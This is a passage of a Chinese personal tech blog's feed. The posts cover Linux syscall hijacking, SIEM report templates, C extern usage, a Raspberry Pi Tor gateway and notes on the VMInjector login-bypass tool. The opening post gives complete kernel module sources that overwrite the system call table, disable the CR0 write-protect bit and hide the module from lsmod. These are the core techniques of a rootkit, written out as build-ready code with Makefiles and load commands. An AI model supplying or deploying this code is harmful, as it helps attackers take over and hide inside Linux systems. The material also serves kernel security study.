    _sys_call_page = virt_to_page(&amp;amp;syscall_table);
 
    pages_rw(_sys_call_page, 1);
     
    // now we can use the sys_call_table
     
    ...
}   &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面是一个样例的代码.(hijack.c)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;linux/init.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/kernel.h&amp;gt; 
#include &amp;lt;linux/errno.h&amp;gt; 
#include &amp;lt;linux/types.h&amp;gt;
#include &amp;lt;linux/unistd.h&amp;gt;
#include &amp;lt;asm/cacheflush.h&amp;gt;  
#include &amp;lt;asm/page.h&amp;gt;  
#include &amp;lt;asm/current.h&amp;gt;
#include &amp;lt;linux/sched.h&amp;gt;
#include &amp;lt;linux/kallsyms.h&amp;gt;
 
unsigned long *syscall_table = (unsigned long *)0xc05d2180; 
 
void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc012fbb0;
void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc012fe80;
 
asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
 
asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {
 
    // hijacked write
 
    printk(KERN_ALERT &amp;quot;WRITE HIJACKED&amp;quot;);
 
    return (*original_write)(fd, buf, count);
}
 
static int init(void) {
 
    struct page *sys_call_page_temp;
 
    printk(KERN_ALERT &amp;quot;\nHIJACK INIT\n&amp;quot;);
 
    sys_call_page_temp = virt_to_page(&amp;amp;syscall_table);
    pages_rw(sys_call_page_temp, 1);
 
    original_write = (void *)syscall_table[__NR_write];
    syscall_table[__NR_write] = new_write;  
 
    return 0;
}
 
static void exit(void) {
 
    struct page *sys_call_page_temp;
    
    sys_call_page_temp = virt_to_page(syscall_table);
    syscall_table[__NR_write] = original_write;  
    pages_ro(sys_call_page_temp, 1);
     
    printk(KERN_ALERT &amp;quot;MODULE EXIT\n&amp;quot;);
 
    return;
}
 
module_init(init);
module_exit(exit);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(((这个方法在ubuntu12.04 Linux litsand-VirtualBox 3.2.0-45-generic-pae #70-Ubuntu SMP Wed May 29 20:31:05 UTC 2013 i686 i686 i386 GNU/Linux 测试失败.centos 5.4上system.map直接没有这两个函数的地址 )))&lt;/p&gt;

&lt;p&gt;下面是对应的Makefile文件:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;obj-m   := hijack.o
 
KDIR    := /lib/modules/$(shell uname -r)/build
PWD    := $(shell pwd)
 
default:
    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以通过一下命令加载模块:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ sudo insmod hijack.ko&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='cr0'&gt;绕过CR0保护&lt;/h2&gt;

&lt;p&gt;有些cpu会把CR(control register)设置成0,代表这保护模式.这种保护模式最早出现在intel的80286上.这个标志位也叫做wp-bit.可以通过一下方式来验证.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ cat /proc/cpuinfo | grep wp
wp      : yes
wp      : yes&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;详细的CR0资料可以参考&lt;a href='http://en.wikipedia.org/wiki/Control_register#CR0'&gt;wiki&lt;/a&gt;.如果WP设置为1,那么cpu是写保护模式.设置为0的时候是读写模式.&lt;/p&gt;

&lt;p&gt;如果cpu处于写保护模式,那么我们尝试加载&amp;#8221;hijack.ko&amp;#8221;模块的时候,内核把它结束掉.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ sudo insmod hijack.ko
Killed&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以我们把这个标志位设置为0就可以读写内存页面了(包括系统调用表).内核里提供了如下函数修改CR0&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#define read_cr0 () (native_read_cr0 ())
#define write_cr0 (x) (native_write_cr0 (x))&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两个native read/write函数的定义如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;static inline unsigned long native_read_cr0 (void)
{
         unsigned long val;
         asm volatile(&amp;quot;movl %%cr0,%0\n\t&amp;quot; :&amp;quot;=r&amp;quot; (val));
         return val;
}
 
static inline void native_write_cr0 (unsigned long val)
{
         asm volatile(&amp;quot;movl %0,%%cr0&amp;quot;: :&amp;quot;r&amp;quot; (val));
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;#8220;read_cr0&amp;#8221;函数返回寄存器CR0的值,&amp;#8221;write_cr0&amp;#8221;函数设置这个寄存器的值.&lt;/p&gt;

&lt;p&gt;所以我们可以通过一下的方式来开启/关闭保护模式.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/* disable protected mode
 
   I perform a not operation to 0x10000 ( so I have 0x01111). 
   Later I perform an AND operation between the current value 
   of the CR0 register and 0x01111. So the WP bit is set to 0 
   and the protected mode is disabled.
 
*/
 
write_cr0 (read_cr0 () &amp;amp; (~ 0x10000));
 
/* enable protected mode
 
   I perform an OR operation between the current value of 
   the CR0 register and 0x10000. So the WP bit is set to 1 
   and the protected mode is enabled.
    
*/
    
write_cr0 (read_cr0 () | 0x10000);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;修改过的源码.(hijack2.c)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;linux/init.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/kernel.h&amp;gt; 
#include &amp;lt;linux/errno.h&amp;gt; 
#include &amp;lt;linux/types.h&amp;gt;
#include &amp;lt;linux/unistd.h&amp;gt;
#include &amp;lt;asm/cacheflush.h&amp;gt;  
#include &amp;lt;asm/page.h&amp;gt;  
#include &amp;lt;asm/current.h&amp;gt;
#include &amp;lt;linux/sched.h&amp;gt;
#include &amp;lt;linux/kallsyms.h&amp;gt;
 
unsigned long *syscall_table = (unsigned long *)0xc05d2180; 
 
asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
 
asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {
 
    // hijacked write
 
    printk(KERN_ALERT &amp;quot;WRITE HIJACKED&amp;quot;);
 
    return (*original_write)(fd, buf, count);
}
 
static int init(void) {
 
    printk(KERN_ALERT &amp;quot;\nHIJACK INIT\n&amp;quot;);
 
    write_cr0 (read_cr0 () &amp;amp; (~ 0x10000));
 
    original_write = (void *)syscall_table[__NR_write];
    syscall_table[__NR_write] = new_write;  
 
    write_cr0 (read_cr0 () | 0x10000);
 
    return 0;
}
 
static void exit(void) {
 
    write_cr0 (read_cr0 () &amp;amp; (~ 0x10000));
 
    syscall_table[__NR_write] = original_write;  
 
    write_cr0 (read_cr0 () | 0x10000);
     
    printk(KERN_ALERT &amp;quot;MODULE EXIT\n&amp;quot;);
 
    return;
}
 
module_init(init);
module_exit(exit);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Makefile:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;obj-m   := hijack2.o
 
KDIR    := /lib/modules/$(shell uname -r)/build
PWD    := $(shell pwd)
 
default:
    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在加载我们的模块就不吹出错了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ sudo insmod hijack2
spaccio@spaccio-laptop:~$&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2632'&gt;隐藏内核模块&lt;/h2&gt;

&lt;p&gt;隐藏我们的模块很简单.把它从模块列表中去掉就可以了.(lsmod 和/proc/modules). 下面是源代码:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;linux/init.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/kernel.h&amp;gt; 
#include &amp;lt;linux/errno.h&amp;gt; 
#include &amp;lt;linux/types.h&amp;gt;
#include &amp;lt;linux/unistd.h&amp;gt;
#include &amp;lt;asm/cacheflush.h&amp;gt;  
#include &amp;lt;asm/page.h&amp;gt;  
#include &amp;lt;asm/current.h&amp;gt;
#include &amp;lt;linux/sched.h&amp;gt;
#include &amp;lt;linux/kallsyms.h&amp;gt;
 
 
static int init(void) {
 
    list_del_init(&amp;amp;__this_module.list);
 
    return 0;
}
 
static void exit(void) {
 
    return;
}
 
module_init(init);
module_exit(exit);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Makefile:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;obj-m   := hijack3.o

KDIR    := /lib/modules/$(shell uname -r)/build
PWD    := $(shell pwd)

default:
$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在使用lsmod命令就看不到我们的模块了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spaccio@spaccio-laptop:~$ sudo insmod hijack3
spaccio@spaccio-laptop:~$ lsmod
Module                  Size  Used by
kernel_redir            2200  1 
aes_i586                7280  2 
aes_generic            26875  1 aes_i586
rfcomm                 33811  6 
binfmt_misc             6599  1 
sco                     7998  2 
bnep                    9542  2 
l2cap                  37008  16 rfcomm,bnep
vboxnetadp              6454  0 
vboxnetflt             15216  0 
...
spaccio@spaccio-laptop:~$ lsmod |grep hijack3.ko
spaccio@spaccio-laptop:~$&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这一切都要归功于&amp;#8221;list_del_init()&amp;#8221;函数.这个函数是这样定义的:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;static inline void list_del_init (struct list_head * entry)
{
__list_del (entry-&amp;gt;prev, entry-&amp;gt;next);
INIT_LIST_HEAD (entry);
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;#8221;__list_del()&amp;#8221;和&amp;#8221;INIT_LIST_HEAD()&amp;#8221;函数定义如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;static inline void __list_del (struct list_head * prev, struct list_head * next)
{
     next-&amp;gt; prev = prev;
     prev-&amp;gt; next = next;
}
 
static inline void INIT_LIST_HEAD (struct list_head * list)
{
     list-&amp;gt; next = list;
     list-&amp;gt; prev = list;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以 &amp;#8220;list_del_init()&amp;#8221;函数把我们模块的名字从管理模块列表的双向链表中删掉了.这样我们用lsmod命令(或者在/proc/modules文件中)就看不到这个模块了.&lt;/p&gt;

&lt;h2 id='id2633'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/'&gt;memset&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/16/syscall-hijackingkernel-26-systems</link>
                <guid>http://username.github.io/技术研究/2013/10/16/syscall-hijackingkernel-26-systems</guid>
                <pubDate>2013-10-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>solarwinds 报表分析</title>
                <description>&lt;p&gt;solarwinds的报表是利用一个专门的report客户端连接数据库,利用rpt模板产生报表.做的比较简陋相对来说.&lt;/p&gt;

&lt;p&gt;报表分为3大类:audit,security,support,一共246个报表.&lt;/p&gt;

&lt;h2 id='audit'&gt;audit子类:&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;authentication:(域各种权限的审计)&lt;/li&gt;

&lt;li&gt;file audit&lt;/li&gt;

&lt;li&gt;resource configure&lt;/li&gt;

&lt;li&gt;networktrafic (目前不具备)&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id='security'&gt;security&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;event summary&lt;/li&gt;

&lt;li&gt;authentication&lt;/li&gt;

&lt;li&gt;malicious code&lt;/li&gt;

&lt;li&gt;suspicious behaviour&lt;/li&gt;

&lt;li&gt;machine audit&lt;/li&gt;

&lt;li&gt;attack behavior-access&lt;/li&gt;

&lt;li&gt;attack behavior-denial-relay&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id='support'&gt;support&lt;/h2&gt;

&lt;p&gt;自身的一些数据统计&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;internal system&lt;/li&gt;

&lt;li&gt;incident&lt;/li&gt;

&lt;li&gt;database maintenance&lt;/li&gt;
&lt;/ol&gt;</description>
                <link>http://username.github.io/2013/10/15/solarwinds-</link>
                <guid>http://username.github.io/2013/10/15/solarwinds-</guid>
                <pubDate>2013-10-15T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>extern声明外部变量</title>
                <description>&lt;h2 id='id2629'&gt;转载&lt;/h2&gt;

&lt;p&gt;http://www.chsi.com.cn/xy/com/201001/20100118/62031919.html&lt;/p&gt;

&lt;p&gt;全局变量(外部变量)是在函数的外部定义的，它的作用域为从变量的定义处开始，到本程序文件的末尾。在此作用域内，全局变量可以为本文件中各个函数所引用。编译时将全局变量分配在静态存储区。&lt;/p&gt;

&lt;p&gt;有时需要用extern来声明全局变量，以扩展全局变量的作用域。&lt;/p&gt;

&lt;p&gt;　　1. 在一个文件内声明全局变量&lt;/p&gt;

&lt;p&gt;　　如果外部变量不在文件的开头定义，其有效的作用范围只限于定义处到文件终了。如果在定义点之前的函数想引用该全局变量，则应该在引用之前用关键字extern对该变量作外部变量声明，表示该变量是一个将在下面定义的全局变量。有了此声明，就可以从声明处起，合法地引用该全局变量，这种声明称为提前引用声明。&lt;/p&gt;

&lt;p&gt;　　例4.14 用extern对外部变量作提前引用声明，以扩展程序文件中的作用域。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;　　#include &amp;lt;iostream&amp;gt;

　　using namespace std;

　　int max(int,int); //函数声明

　　void main( )

　　{extern int a,b; //对全局变量a,b作提前引用声明

　　cout&amp;lt;&amp;lt;max(a,b)&amp;lt;&amp;lt;endl;

　　}

　　int a=15,b=-7; //定义全局变量a,b

　　int max(int x,int y)

　　{int z;

　　z=x&amp;gt;y?x：y;

　　return z;

　　}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　运行结果如下：&lt;/p&gt;

&lt;p&gt;　　15&lt;/p&gt;

&lt;p&gt;　　在main后面定义了全局变量a，b，但由于全局变量定义的位置在函数main之后，因此如果没有程序的第5行，在main函数中是不能引用全局变量a和b的。现在我们在main函数第2行用extern对a和b作了提前引用声明，表示a和b是将在后面定义的变量。这样在main函数中就可以合法地使用全局变量a和b了。如果不作extern声明，编译时会出错，系统认为a和b未经定义。一般都把全局变量的定义放在引用它的所有函数之前，这样可以避免在函数中多加一个extern声明。&lt;/p&gt;

&lt;p&gt;　　2. 在多文件的程序中声明外部变量&lt;/p&gt;

&lt;p&gt;　　如果一个程序包含两个文件，在两个文件中都要用到同一个外部变量num，不能分别在两个文件中各自定义一个外部变量num。正确的做法是：在任一个文件中定义外部变量num，而在另一文件中用extern对num作外部变量声明。即&lt;/p&gt;

&lt;p&gt;　　extern int num;&lt;/p&gt;

&lt;p&gt;　　编译系统由此知道num是一个已在别处定义的外部变量，它先在本文件中找有无外部变量num，如果有，则将其作用域扩展到本行开始(如上节所述)，如果本文件中无此外部变量，则在程序连接时从其他文件中找有无外部变量num，如果有，则把在另一文件中定义的外部变量num的作用域扩展到本文件，在本文件中可以合法地引用该外部变量num。&lt;/p&gt;

&lt;p&gt;　　分析下例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;　　file1.cpp file2.cpp

　　extern int a,b; int a=3,b=4;

　　int main( ) ┆

　　{cout&amp;lt;&amp;lt;a&amp;lt;&amp;lt;″,″&amp;lt;&amp;lt;b&amp;lt;&amp;lt;endl;

　　return 0;

　　}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　用extern扩展全局变量的作用域，虽然能为程序设计带来方便，但应十分慎重，因为在执行一个文件中的函数时，可能会改变了该全局变量的值，从而会影响到另一文件中的函数执行结果。&lt;/p&gt;</description>
                <link>http://username.github.io/代码人生/2013/10/15/extern</link>
                <guid>http://username.github.io/代码人生/2013/10/15/extern</guid>
                <pubDate>2013-10-15T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>accelops report templates</title>
                <description>&lt;h2 id='event_status'&gt;event status&lt;/h2&gt;

&lt;p&gt;目前按地理分布,趋势分布(可以参考完善一下)&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Total Event Rate&lt;/li&gt;

&lt;li&gt;Top Dest IP by Count&lt;/li&gt;

&lt;li&gt;Top Events By count&lt;/li&gt;

&lt;li&gt;top reporting device by event count&lt;/li&gt;

&lt;li&gt;top src ip by count&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&amp;#8230;&amp;#8230;&lt;/p&gt;

&lt;h2 id='incidents'&gt;incidents&lt;/h2&gt;

&lt;p&gt;:&lt;/p&gt;

&lt;h2 id='biz_service'&gt;biz service&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;top events by severity,count-dhcp/dns service&lt;/li&gt;

&lt;li&gt;top events by severity,count-firewall service&lt;/li&gt;

&lt;li&gt;top events by severity,count-vpn service&lt;/li&gt;

&lt;li&gt;top events by severity,count-auth service 其实跟device有些重复&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id='device'&gt;device&lt;/h2&gt;

&lt;p&gt;network:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;router/switch&lt;/li&gt;
&lt;/ol&gt;</description>
                <link>http://username.github.io/2013/10/15/accelops-report-templates</link>
                <guid>http://username.github.io/2013/10/15/accelops-report-templates</guid>
                <pubDate>2013-10-15T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>劫持系统调用 kernel 2.6</title>
                <description></description>
                <link>http://username.github.io/2013/10/15/-kernel-26</link>
                <guid>http://username.github.io/2013/10/15/-kernel-26</guid>
                <pubDate>2013-10-15T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>raspberry pi 搭建tor网络</title>
                <description>&lt;p&gt;https://www.idontplaydarts.com/2013/01/raspberry-pi-and-tor-for-slightly-easier-opsec/&lt;/p&gt;

&lt;p&gt;为了更好的保护自己我在树莓派上安装了一个tor客户端.笔记本通过树莓派上网,把树莓派设置成所有的流量通过tor网络传输.这个方案的成本不超过50美金,但是可以极大的降低真实ip地址泄漏的风险.&lt;/p&gt;

&lt;p&gt;即使笔记本被入侵控制了,这样一个物理隔离的硬件设备也可以保护你的身份不被识别出来.(当然,你的笔记本上不能保存着自己的身份信息)&lt;/p&gt;

&lt;h2 id='id2624'&gt;软件安装&lt;/h2&gt;

&lt;p&gt;即使对熟悉linux的人来说,设置树莓派也是一个漫长的过程.我选择了&amp;#8221;Raspbian&amp;#8221;这个基于Debian的系统.然后就是安装一系列软件.&lt;/p&gt;

&lt;p&gt;sshd-管理树莓派用,监听eth0&lt;/p&gt;

&lt;p&gt;iptables-控制设备的访问&lt;/p&gt;

&lt;p&gt;macchanger-连接互联网的网卡随机生成mac地址&lt;/p&gt;

&lt;p&gt;wireless-tools and wpa_supplicant-连接无线网&lt;/p&gt;

&lt;p&gt;因为树莓派只有一个以太网卡所以我们需要一个额外的usb以太网卡或者usb无线网卡.我用的是&lt;a href='http://www.amazon.com/Alfa-Wireless-Original-Screw-On-9dBi/dp/B001O9X9EU'&gt;Alpha Card&lt;/a&gt;,它的兼容性比较好.&lt;/p&gt;

&lt;p&gt;Tor和Polipo(一个代理程序)会占用比较多的内存,所以选用B型号的树莓派(512内存)性能会好一点.&lt;/p&gt;

&lt;p&gt;整个网络的拓扑如下图:&lt;/p&gt;

&lt;p&gt;&lt;img alt='network' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/berry.png' /&gt;&lt;/p&gt;

&lt;p&gt;如果需要socks方式代理,可以在eth0上开放Tor socks proxy的端口(TCP/9050)&lt;/p&gt;

&lt;h2 id='id2625'&gt;系统设置&lt;/h2&gt;

&lt;p&gt;树莓派的所以服务都配置成不保存日志.此外SSH设置成keys密钥对登录的方式.私钥不要保存在笔记本上!硬盘进行加密.&lt;/p&gt;

&lt;h2 id='id2626'&gt;电源&lt;/h2&gt;

&lt;p&gt;树莓派通过笔记本的USB供电,所以便携性非常好.树莓派启动的过程大概需要一分钟.&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/berry2.jpg' /&gt;&lt;/p&gt;

&lt;h2 id='id2627'&gt;总结&lt;/h2&gt;

&lt;p&gt;这个设备可以比较好的保护你在网络上的匿名性.如果是通过免费的wifi连接上互联网,那么别人识别你的身份会更加困难.&lt;/p&gt;

&lt;h2 id='id2628'&gt;扩展阅读&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://learn.adafruit.com/onion-pi/overview'&gt;Onion Pi&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/12/raspberry-pi-tor</link>
                <guid>http://username.github.io/技术研究/2013/10/12/raspberry-pi-tor</guid>
                <pubDate>2013-10-12T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>xml学习笔记</title>
                <description>&lt;h2 id='dtd_vs_xsd'&gt;dtd vs xsd&lt;/h2&gt;

&lt;p&gt;http://stackoverflow.com/questions/2389760/how-to-choose-between-dtd-and-xsd&lt;/p&gt;

&lt;p&gt;http://www.w3schools.com/schema/schema_howto.asp&lt;/p&gt;

&lt;p&gt;http://www.sitepoint.com/xml-dtds-xml-schema/&lt;/p&gt;

&lt;p&gt;so xsd is better&lt;/p&gt;

&lt;h2 id='xxe'&gt;xxe&lt;/h2&gt;

&lt;p&gt;http://zone.wooyun.org/content/531&lt;/p&gt;

&lt;p&gt;http://www.80sec.com/xml-entity-injection.html&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/11/xml</link>
                <guid>http://username.github.io/技术研究/2013/10/11/xml</guid>
                <pubDate>2013-10-11T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>proc_root undeclared</title>
                <description>&lt;p&gt;参考&lt;/p&gt;

&lt;p&gt;http://stackoverflow.com/questions/2531730/linux-kernel-module-creating-proc-file-proc-root-undeclared-error&lt;/p&gt;

&lt;p&gt;That example is out of date. Under the current kernel API, pass NULL for the root of procfs.&lt;/p&gt;

&lt;p&gt;Also, instead of create_proc_entry, you should use proc_create() with a proper const struct file_operations *.&lt;/p&gt;</description>
                <link>http://username.github.io/代码人生/2013/10/11/proc_root-undeclared</link>
                <guid>http://username.github.io/代码人生/2013/10/11/proc_root-undeclared</guid>
                <pubDate>2013-10-11T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>kernel source mismatch</title>
                <description>&lt;p&gt;uname -r 显示内核是2.6.18-164.el5&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum install kernel-devel
yum install kernel-headers&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;安装的确实2.6.18-384&amp;#8230;&amp;#8230;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum install kernel-devel-2.6.18-164.el5&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;提示没有这个包&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum update kernel 好像也没提示成功?可能应该是升级一下.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重启之后就好了.变成高一点的版本了.&lt;/p&gt;

&lt;p&gt;https://www.centos.org/modules/newbb/viewtopic.php?topic_id=30377&lt;/p&gt;</description>
                <link>http://username.github.io/2013/10/11/kernel-source-mismatch</link>
                <guid>http://username.github.io/2013/10/11/kernel-source-mismatch</guid>
                <pubDate>2013-10-11T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>accelops试用</title>
                <description>&lt;h2 id='accelops'&gt;accelops试用分析&lt;/h2&gt;

&lt;p&gt;从content的角度以及soc类产品对数据的主要处理流程的分析和对比.&lt;/p&gt;

&lt;h1 id='id2616'&gt;数据来源&lt;/h1&gt;

&lt;p&gt;日志收集:支持更多种协议.SNMP, Syslog, WMI, Cisco SDEE,Checkpoint LEA, JDBC, VMWare VI-SDK, JMX, Telnet, SSH, network flow,and HTTP(S)&lt;/p&gt;

&lt;p&gt;资产管理:跟splunk不同,accelops是不用agent的,它直接通过telnet或者ssh连接机器,获取需要的日志和配置信息等.它的资产管理支持自动发现,不需要一个一个手动添加.不过,它通过ssh连接资产,所有的设备的认证信息都是需要保存在accelops里的,个人觉得这种做法也存在较大的安全风险.&lt;/p&gt;

&lt;p&gt;相对我们的综合日志审计,accelops支持了更多一些的小众的协议,资产管理采用自动发现,自动分类.&lt;/p&gt;

&lt;h1 id='id2617'&gt;数据处理&lt;/h1&gt;

&lt;p&gt;数据解析归一化:尝试接入几台设备的日志信息没有成功.暂时还没有查到accelops具体是如何解析日志数据的.&lt;/p&gt;

&lt;h1 id='id2618'&gt;数据统计&lt;/h1&gt;

&lt;p&gt;统计模板:统计模板从多个角度分类,合规报表就有PCI,COBIT,SOC,ISO,HIPAA,GLBA,FISMA,NERC,等.这块我们可以借鉴的比较多.主要的困难还是工作量比较大.做一个新的统计报表可能需要修改解析规则.&lt;/p&gt;

&lt;h1 id='id2619'&gt;知识积累&lt;/h1&gt;

&lt;p&gt;漏洞库等:我们有弱点管理,漏洞库,三维关联.这块是accelops没有的.&lt;/p&gt;

&lt;h1 id='id2620'&gt;数据分析&lt;/h1&gt;

&lt;p&gt;关联规则:accelops的优势有很多性能,可用性方面的规则.我们重点还是安全方面的规则.&lt;/p&gt;

&lt;p&gt;数据挖掘:我们具有数据挖掘的模块.accelops没有.&lt;/p&gt;

&lt;h1 id='id2621'&gt;告警和阻断&lt;/h1&gt;

&lt;p&gt;告警方式:都可以通过多种方式发送告警信息.(消息提醒,email等)&lt;/p&gt;

&lt;h2 id='id2622'&gt;详细对比&lt;/h2&gt;

&lt;h1 id='id2623'&gt;概述&lt;/h1&gt;

&lt;p&gt;accelops跟splunk一样,都定位自己为数据中心.对比我们的综合日志审计,它有一些很有特色的功能.比如它可以自动画出管理资产的网络拓扑图.(这是跟它的资产管理方式相关的,跟我们的资产管理方式不太一样).有一个配置管理的库,可以监控配置变更.数据统计方面,它的模板的分类和数量非常丰富.尤其突出了运维监控,业务管理等方面.而我们的报表重点是依托于日志审计的安全合规方面.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/10/accelops</link>
                <guid>http://username.github.io/技术研究/2013/10/10/accelops</guid>
                <pubDate>2013-10-10T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>win7下psutil access denied的问题</title>
                <description>&lt;h2 id='id2614'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://www.blog.pythonlibrary.org/2010/10/03/how-to-find-and-list-all-running-processes-with-python/&lt;/p&gt;

&lt;p&gt;https://groups.google.com/forum/#!topic/psutil/7Iv3L6GPeaI&lt;/p&gt;

&lt;p&gt;Note: While this last script appears to work just fine on Windows XP, on Windows 7 32 and 64-bit, you will get an “Access Denied” traceback, I suspect this is caused by Window 7′s increased security, but I will try to find a workaround.&lt;/p&gt;

&lt;p&gt;UPDATE (10/09/2010) – The psutil folks don’t know why it doesn’t work, but one of their developers has confirmed the issue. You can follow along on their Google Groups list.&lt;/p&gt;

&lt;h2 id='id2615'&gt;测试环境&lt;/h2&gt;

&lt;p&gt;win7 64bit&lt;/p&gt;

&lt;p&gt;python 2.7.5 最新&lt;/p&gt;

&lt;p&gt;psutil 1.1 最新&lt;/p&gt;

&lt;p&gt;遍历进程的时候,对smss.exe(system)访问拒绝.还有几个local service用户的进程.采用administrator和system运行cmd,都存在这个问题.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/10/08/win7psutil-access-denied</link>
                <guid>http://username.github.io/技术研究/2013/10/08/win7psutil-access-denied</guid>
                <pubDate>2013-10-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>vminjector绕过虚拟机认证</title>
                <description>&lt;p&gt;https://github.com/batistam/VMInjector/tree/master/vminjector-src&lt;/p&gt;

&lt;p&gt;http://www.secforce.com/blog/2012/11/vminjector/&lt;/p&gt;

&lt;p&gt;xp 32bit 和win7 64bit使用python脚本都遇到了权限的问题.貌似是psutil不够给力?&lt;/p&gt;

&lt;p&gt;而且vmware station v7 v8 都测试失败了.注入dll的时候失败.&lt;/p&gt;

&lt;p&gt;!!!!!!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;VMInjector是一个绕过VMware Wordstation/Player上虚拟机登录认证的工具.支持当前大部分主流操作系统.&lt;/p&gt;

&lt;p&gt;它的原理是直接操作内存的方式来绕过登录认证.所以这种内存补丁的方式是不持久的,虚拟机重启之后会恢复正常的密码验证功能.&lt;/p&gt;

&lt;p&gt;利用条件:&lt;/p&gt;

&lt;p&gt;1, 宿主机需要是windows(有管理员权限)&lt;/p&gt;

&lt;p&gt;2, 虚拟化软件是VMware workstation或者player&lt;/p&gt;

&lt;p&gt;3, 存在锁定的虚拟机&lt;/p&gt;

&lt;p&gt;支持的版本:&lt;/p&gt;

&lt;p&gt;宿主机支持32位和64位的windows,虚拟机支持win7,xin xp,MAC OS X,ubuntu大部分版本.&lt;/p&gt;

&lt;p&gt;在64位win7主机,vmware 7.1.0,32位xp虚拟机测试通过&lt;/p&gt;

&lt;p&gt;下载地址:https://github.com/batistam/VMInjector&lt;/p&gt;

&lt;p&gt;测试心得:&lt;/p&gt;

&lt;p&gt;github提供的源码中是用python脚本来注入DLL,我用python2.7.5,psutil模块1.1最新版,遍历主机进程的时候存在权限不够的问题.(貌似是psutil模块问题?).而且测试了多次都是注入失败.后来发现作者博客里演示的时候用的是编译好的exe.这两个exe在github上也有,只是后来被作者删掉了.不知道为什么.&lt;/p&gt;

